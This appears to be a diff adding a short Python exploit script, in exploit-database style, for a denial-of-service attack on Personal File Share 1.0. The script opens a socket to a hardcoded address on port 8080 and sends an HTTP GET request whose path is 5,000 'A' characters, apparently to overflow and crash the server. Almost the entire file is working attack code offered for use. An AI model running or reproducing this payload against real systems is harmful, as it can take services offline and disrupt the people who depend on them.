@@ -1,0 +1,21 @@
+#!/usr/bin/python
+
+#Exploit Title: Personal File Share 1.0 DoS
+#Date: 2nd April 2013
+#Exploit Author: npn
+#Vendor Homepage: http://www.srplab.com/
+#Software Link: http://download.cnet.com/Personal-File-Share/3000-18506_4-75893424.html
+#Version: 1.0                
+#Tested on: Windows XP SP3 English
+
+import socket, sys
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect(("192.168.32.129", 8080))
+
+buffer = "GET /"
+buffer += "A"*5000
+buffer += " HTTP/1.1\r\n\r\n"
+
+sock.send(buffer)
+
+sock.close()
